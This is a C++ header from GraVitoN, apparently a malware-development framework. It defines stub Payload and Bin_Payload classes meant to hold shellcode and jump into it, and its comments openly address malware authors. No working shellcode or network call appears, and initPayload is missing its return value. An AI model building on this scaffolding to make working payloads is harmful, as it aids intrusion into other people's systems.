/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN::Payload and GraVitoN::Bin_Payload
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_HEAD_
#define _GVN_PAYLOAD_HEAD_

#include "../graviton.hpp"
#include <string>
#include <cstring>
using namespace std;

/// @note Do Not test remote payloads against '127.0.0.1' always set some non-localhost IP!
/// @note Remember, you should set 'CXXFLAGS=-O0' when compiling Bin_Payloads

/// @todo Run Bin_Payloads even if optimization flags are set.

namespace GraVitoN
{
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief Payload execution class
 *
 * You want to code new payload to your malware? This where you should
 * start.\n \n \n
 * <b> I'm Drunk, and Sadjad (void), My Best Friend Is Dead (Suicide). =( [07/02/12] </b>
 * 
 */
class Payload : public Component
{
public:
	/// Constructor
    Payload();

	/// Destructor
    virtual ~Payload();

	/**
	 * @brief CALL your payload
	 *
	 * After you initialized your payload, this is the exact time you should call 'call' method
	 *
	 * @return
	 * True if it's done successfully
	 * 
	 */
    virtual bool run();
};


/**
 * @brief Binary payload class
 *
 * If you want to design a class to load a binary shell use this class.
 *
 * @note To build binary payloads you need to disable optimization flag (-O0)
 *
 */

class Bin_Payload : public Payload
{
protected:
	/// Payload Hex Array
    unsigned char *payload;

	/// Size of your payload in bytes
    int payload_size;

	/// Start address of your payload
    void ( *jumper ) ( void * );

	/**
	 * @brief Initialize your payload's assembly code
	 *
	 * Apply your options (bind port) and set jumper memory
	 *
	 */
    virtual bool initPayload();

public:
	Bin_Payload();
	~Bin_Payload();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload::Payload()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload::~Payload()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload::run()
{
    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Bin_Payload::Bin_Payload()
{
	options = "<no options>";
	
	jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Bin_Payload::~Bin_Payload()
{
	try
	{
//		if( payload )
//			delete payload;
	}
	catch(...)
	{
		Logger::logItLn("Bin_Payload::~Bin_Payload Exception");
	}
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Bin_Payload::initPayload()
{
	Logger::logItLn("Init payload memory...");
}

}

#endif // _GVN_PAYLOAD_HEAD_
